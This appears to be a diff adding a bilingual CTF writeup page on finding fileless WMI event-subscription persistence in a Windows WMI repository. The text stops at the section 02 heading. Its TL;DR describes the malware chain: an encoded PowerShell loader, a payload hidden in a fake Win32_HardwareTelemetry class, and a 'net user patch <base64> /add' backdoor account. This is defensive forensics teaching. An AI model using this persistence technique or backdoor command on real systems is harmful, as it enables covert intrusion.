@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo" data-en="After Hours (THM): fileless WMI persistence → .NET payload — NonèCostanzo">After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor." data-en="TryHackMe After Hours writeup (Hacker Holidays 2026): forensics runbook — fileless WMI persistence in the OBJECTS.DATA repository, CommandLineEventConsumer with PowerShell -enc, custom Win32_HardwareTelemetry class, base64+deflate .NET payload and the flag in the backdoor." content="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo" data-en="After Hours (THM): fileless WMI persistence → .NET payload — NonèCostanzo" content="After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor." data-en="TryHackMe After Hours writeup (Hacker Holidays 2026): forensics runbook — fileless WMI persistence in the OBJECTS.DATA repository, CommandLineEventConsumer with PowerShell -enc, custom Win32_HardwareTelemetry class, base64+deflate .NET payload and the flag in the backdoor." content="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="After Hours — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-08-07T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-08-07T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo" data-en="After Hours (THM): fileless WMI persistence → .NET payload — NonèCostanzo" content="After Hours (THM): persistenza WMI fileless → payload .NET — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor." data-en="TryHackMe After Hours writeup (Hacker Holidays 2026): forensics runbook — fileless WMI persistence in the OBJECTS.DATA repository, CommandLineEventConsumer with PowerShell -enc, custom Win32_HardwareTelemetry class, base64+deflate .NET payload and the flag in the backdoor." content="Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics — persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"After Hours (THM): persistenza WMI fileless \u2192 payload .NET",
+  "description":"Writeup TryHackMe After Hours (Hacker Holidays 2026): runbook forensics \u2014 persistenza WMI fileless nel repository OBJECTS.DATA, CommandLineEventConsumer con PowerShell -enc, classe custom Win32_HardwareTelemetry, payload .NET base64+deflate e flag nella backdoor.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/og.png"],"datePublished":"2026-08-07T09:00:00+02:00","dateModified":"2026-08-07T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, After Hours, Forensics, WMI, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — After Hours"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"After Hours","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/after-hours/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">After Hours</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Forensics</span><span class="tag">WMI</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-08-07" data-it="07 Ago 2026" data-en="07 Aug 2026">07 Ago 2026</time>
+      <span class="meta-item" data-it="11 min di lettura" data-en="11 min read">11 min di lettura</span>
+      <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
+      <span class="meme-tag" data-it="// WMI: dove i malware vanno in vacanza" data-en="// WMI: where malware takes its holidays">// WMI: dove i malware vanno in vacanza</span>
+    </div>
+    <h1 data-it="After Hours: la backdoor che timbra il cartellino dal repository WMI" data-en="After Hours: the backdoor clocking in from the WMI repository">After Hours: la backdoor che timbra il cartellino dal repository WMI</h1>
+    <p class="article-intro" data-it="A luci spente e ospiti a nanna, una macchina di back-office del Byte Lotus continua a fare login nelle ore piccole — ben dopo che il tecnico del turno di notte è andato a casa. In Startup, Scheduled Tasks e chiavi Run del registro non c'è niente: qualunque cosa la tenga viva si nasconde in un angolo che «i tool di solito non pensano di controllare». Traduzione: &lt;strong&gt;persistenza WMI fileless&lt;/strong&gt;, e l'unico modo per beccarla è scavare a mano nel repository. L'allegato è proprio quello: i 5 file grezzi del repository WMI. Ogni comando qui sotto gira sulla &lt;em&gt;tua&lt;/em&gt; macchina, offline." data-en="Lights off, guests asleep, and a Byte Lotus back-office box keeps logging in during the small hours — long after the night-shift tech has gone home. Startup, Scheduled Tasks and registry Run keys show nothing: whatever keeps it alive hides in a corner &quot;tools don't think to check&quot;. Translation: &lt;strong&gt;fileless WMI persistence&lt;/strong&gt;, and the only way to catch it is to dig through the repository by hand. The attachment is exactly that: the 5 raw files of the WMI repository. Every command below runs on &lt;em&gt;your&lt;/em&gt; machine, offline.">A luci spente e ospiti a nanna, una macchina di back-office del Byte Lotus continua a fare login nelle ore piccole — ben dopo che il tecnico del turno di notte è andato a casa. In Startup, Scheduled Tasks e chiavi Run del registro non c'è niente: qualunque cosa la tenga viva si nasconde in un angolo che «i tool di solito non pensano di controllare». Traduzione: <strong>persistenza WMI fileless</strong>, e l'unico modo per beccarla è scavare a mano nel repository. L'allegato è proprio quello: i 5 file grezzi del repository WMI. Ogni comando qui sotto gira sulla <em>tua</em> macchina, offline.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="I 5 file (&lt;code&gt;INDEX.BTR&lt;/code&gt;, &lt;code&gt;MAPPING*.MAP&lt;/code&gt;, &lt;code&gt;OBJECTS.DATA&lt;/code&gt;) sono il &lt;strong&gt;repository WMI&lt;/strong&gt; di Windows: la persistenza è una &lt;strong&gt;WMI Event Subscription&lt;/strong&gt; fileless, invisibile ad autoruns." data-en="The 5 files (&lt;code&gt;INDEX.BTR&lt;/code&gt;, &lt;code&gt;MAPPING*.MAP&lt;/code&gt;, &lt;code&gt;OBJECTS.DATA&lt;/code&gt;) are the Windows &lt;strong&gt;WMI repository&lt;/strong&gt;: the persistence is a fileless &lt;strong&gt;WMI Event Subscription&lt;/strong&gt;, invisible to autoruns.">I 5 file (<code>INDEX.BTR</code>, <code>MAPPING*.MAP</code>, <code>OBJECTS.DATA</code>) sono il <strong>repository WMI</strong> di Windows: la persistenza è una <strong>WMI Event Subscription</strong> fileless, invisibile ad autoruns.</li><li data-it="Un &lt;code&gt;CommandLineEventConsumer&lt;/code&gt; lancia &lt;code&gt;powershell -enc&lt;/code&gt;; il comando (base64/UTF-16LE) è un &lt;strong&gt;loader&lt;/strong&gt; che legge una proprietà da una classe WMI." data-en="A &lt;code&gt;CommandLineEventConsumer&lt;/code&gt; runs &lt;code&gt;powershell -enc&lt;/code&gt;; the command (base64/UTF-16LE) is a &lt;strong&gt;loader&lt;/strong&gt; reading a property off a WMI class.">Un <code>CommandLineEventConsumer</code> lancia <code>powershell -enc</code>; il comando (base64/UTF-16LE) è un <strong>loader</strong> che legge una proprietà da una classe WMI.</li><li data-it="La &lt;strong&gt;classe custom&lt;/strong&gt; &lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt; (nome finto-legittimo) tiene il payload nella proprietà &lt;code&gt;ConfigData&lt;/code&gt; = base64(deflate(assembly .NET))." data-en="The &lt;strong&gt;custom class&lt;/strong&gt; &lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt; (fake-legit name) stores the payload in its &lt;code&gt;ConfigData&lt;/code&gt; property = base64(deflate(.NET assembly)).">La <strong>classe custom</strong> <code>Win32_HardwareTelemetry</code> (nome finto-legittimo) tiene il payload nella proprietà <code>ConfigData</code> = base64(deflate(assembly .NET)).</li><li data-it="Ricostruito l'assembly, dentro c'è &lt;code&gt;net user patch &amp;lt;base64&amp;gt; /add&lt;/code&gt;: la &lt;strong&gt;password del backdoor è la flag&lt;/strong&gt; (in base64). C'è pure un guard anti-analisi." data-en="Rebuild the assembly and inside is &lt;code&gt;net user patch &amp;lt;base64&amp;gt; /add&lt;/code&gt;: the &lt;strong&gt;backdoor password is the flag&lt;/strong&gt; (base64). There's an anti-analysis guard too.">Ricostruito l'assembly, dentro c'è <code>net user patch &lt;base64&gt; /add</code>: la <strong>password del backdoor è la flag</strong> (in base64). C'è pure un guard anti-analisi.</li></ul>
+    </div>
+    <div class="callout">
+  <div class="callout-label" data-it="// prima di iniziare" data-en="// before you start">// prima di iniziare</div>
+  <p data-it="Caso forensics &lt;strong&gt;offline&lt;/strong&gt;: tutto gira sulla tua macchina sui file dell'allegato, nessun target da attaccare. L'allegato è un archivio protetto: estrailo con &lt;code&gt;7z x -pAft3rH0ursAtt4chm3ntP4ss &amp;lt;allegato&amp;gt;&lt;/code&gt; (oppure &lt;code&gt;unzip -P Aft3rH0ursAtt4chm3ntP4ss &amp;lt;allegato&amp;gt;&lt;/code&gt;; se non sai il formato, &lt;code&gt;file &amp;lt;allegato&amp;gt;&lt;/code&gt; prima) → ottieni &lt;code&gt;INDEX.BTR&lt;/code&gt;, &lt;code&gt;MAPPING*.MAP&lt;/code&gt;, &lt;code&gt;OBJECTS.DATA&lt;/code&gt;. Poi servono solo tool standard: &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;grep&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;, &lt;code&gt;base64&lt;/code&gt;, &lt;code&gt;iconv&lt;/code&gt;." data-en="An &lt;strong&gt;offline&lt;/strong&gt; forensics case: everything runs on your own machine against the attachment files, no target to attack. The attachment is a password-protected archive: extract it with &lt;code&gt;7z x -pAft3rH0ursAtt4chm3ntP4ss &amp;lt;attachment&amp;gt;&lt;/code&gt; (or &lt;code&gt;unzip -P Aft3rH0ursAtt4chm3ntP4ss &amp;lt;attachment&amp;gt;&lt;/code&gt;; if unsure of the format, run &lt;code&gt;file &amp;lt;attachment&amp;gt;&lt;/code&gt; first) → you get &lt;code&gt;INDEX.BTR&lt;/code&gt;, &lt;code&gt;MAPPING*.MAP&lt;/code&gt;, &lt;code&gt;OBJECTS.DATA&lt;/code&gt;. Then only standard tools: &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;grep&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;, &lt;code&gt;base64&lt;/code&gt;, &lt;code&gt;iconv&lt;/code&gt;.">Caso forensics <strong>offline</strong>: tutto gira sulla tua macchina sui file dell'allegato, nessun target da attaccare. L'allegato è un archivio protetto: estrailo con <code>7z x -pAft3rH0ursAtt4chm3ntP4ss &lt;allegato&gt;</code> (oppure <code>unzip -P Aft3rH0ursAtt4chm3ntP4ss &lt;allegato&gt;</code>; se non sai il formato, <code>file &lt;allegato&gt;</code> prima) → ottieni <code>INDEX.BTR</code>, <code>MAPPING*.MAP</code>, <code>OBJECTS.DATA</code>. Poi servono solo tool standard: <code>strings</code>, <code>grep</code>, <code>python3</code>, <code>base64</code>, <code>iconv</code>.</p>
+</div>
+
+
+    <h2 data-it="[01] L'artefatto: è un repository WMI" data-en="[01] The artifact: it's a WMI repository" id='artifact'>[01] L'artefatto: è un repository WMI</h2>
+    <p data-it="Prima regola della forensics: &lt;strong&gt;identifica cosa hai in mano&lt;/strong&gt;. Quei cinque file non sono un dump a caso — sono la struttura precisa del &lt;strong&gt;repository WMI&lt;/strong&gt; di Windows, che vive in &lt;code&gt;C:\Windows\System32\wbem\Repository\&lt;/code&gt;. &lt;code&gt;OBJECTS.DATA&lt;/code&gt; contiene le definizioni di classi e le istanze; &lt;code&gt;INDEX.BTR&lt;/code&gt; è l'indice B-tree; i &lt;code&gt;.MAP&lt;/code&gt; sono le mappe delle pagine." data-en="Forensics rule one: &lt;strong&gt;identify what you're holding&lt;/strong&gt;. Those five files aren't a random dump — they're the exact layout of the Windows &lt;strong&gt;WMI repository&lt;/strong&gt;, which lives in &lt;code&gt;C:\Windows\System32\wbem\Repository\&lt;/code&gt;. &lt;code&gt;OBJECTS.DATA&lt;/code&gt; holds class definitions and instances; &lt;code&gt;INDEX.BTR&lt;/code&gt; is the B-tree index; the &lt;code&gt;.MAP&lt;/code&gt; files are page maps.">Prima regola della forensics: <strong>identifica cosa hai in mano</strong>. Quei cinque file non sono un dump a caso — sono la struttura precisa del <strong>repository WMI</strong> di Windows, che vive in <code>C:\Windows\System32\wbem\Repository\</code>. <code>OBJECTS.DATA</code> contiene le definizioni di classi e le istanze; <code>INDEX.BTR</code> è l'indice B-tree; i <code>.MAP</code> sono le mappe delle pagine.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">ls -la</span>
+<span class="comment"># INDEX.BTR  MAPPING1.MAP  MAPPING2.MAP  MAPPING3.MAP  OBJECTS.DATA</span>
+<span class="ok">= C:\Windows\System32\wbem\Repository\</span>   # il repository WMI</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">ls -la</span>
+<span class="comment"># INDEX.BTR  MAPPING1.MAP  MAPPING2.MAP  MAPPING3.MAP  OBJECTS.DATA</span>
+<span class="ok">= C:\Windows\System32\wbem\Repository\</span>   # the WMI repository</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// perche autoruns non lo becca" data-en="// why autoruns misses it">// perche autoruns non lo becca</div>
+  <p data-it="Gli indizi della room («niente in Startup/Scheduled Tasks/Run key», «i tool non pensano di controllare lì») puntano tutti alla stessa tecnica: &lt;strong&gt;WMI Event Subscription persistence&lt;/strong&gt;. È &lt;em&gt;fileless&lt;/em&gt; — non c'è un eseguibile su disco, tutto vive dentro il DB WMI — ed è storicamente uno dei punti ciechi dei tool di autoruns. La soffiata di @0xMia («scava nei dati grezzi a mano») è letterale." data-en="The room's hints (&quot;nothing in Startup/Scheduled Tasks/Run keys&quot;, &quot;tools don't think to check there&quot;) all point at the same technique: &lt;strong&gt;WMI Event Subscription persistence&lt;/strong&gt;. It's &lt;em&gt;fileless&lt;/em&gt; — no executable on disk, it all lives inside the WMI DB — and historically one of the blind spots of autoruns tooling. @0xMia's tip (&quot;dig through the raw data by hand&quot;) is literal.">Gli indizi della room («niente in Startup/Scheduled Tasks/Run key», «i tool non pensano di controllare lì») puntano tutti alla stessa tecnica: <strong>WMI Event Subscription persistence</strong>. È <em>fileless</em> — non c'è un eseguibile su disco, tutto vive dentro il DB WMI — ed è storicamente uno dei punti ciechi dei tool di autoruns. La soffiata di @0xMia («scava nei dati grezzi a mano») è letterale.</p>
+</div>
+
+    <h2 data-it="[02] Confermare la persistenza" data-en="[02] Confirm the persistence" id='persistence'>[02] Confermare la persistenza</h2>
